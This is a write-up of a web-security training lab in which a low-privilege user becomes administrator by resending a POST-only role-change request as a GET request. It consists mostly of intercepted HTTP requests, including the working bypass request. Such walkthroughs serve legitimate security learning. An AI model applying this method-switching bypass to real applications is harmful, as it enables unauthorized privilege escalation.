Lab Description:

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

The first thing to do is access the application using the administrator credentials, after that, i start Burp and intercept the request to the admin panel:

GET /admin HTTP/1.1
Host: LAB_ID.web-security-academy.net
Cookie: session=sessionADMIN_ID
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://LAB_ID.web-security-academy.net/my-account?id=administrator
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

Nothing different or interesting.

After this request, the admin panel is loaded on the browser and is evident that the upgrade/downgrade user function has to be used to promote my user to administrator, i intercepted the request to this function using the user
Carlos as a test:

POST /admin-roles HTTP/2
Host: LAB_ID.web-security-academy.net
Cookie: session=sessionADMIN_ID
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://LAB_ID.web-security-academy.net
Referer: https://LAB_ID.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&action=upgrade

This request uses the POST method, i ask myself if it can work if i use the GET method with the parameters on the query string, so i logout and login as wiener and try to send this request:

GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: LAB_ID.web-security-academy.net
Cookie: session=sessionUSER_ID
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://LAB_ID.web-security-academy.net
Referer: https://LAB_ID.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

And it works, lab solved.
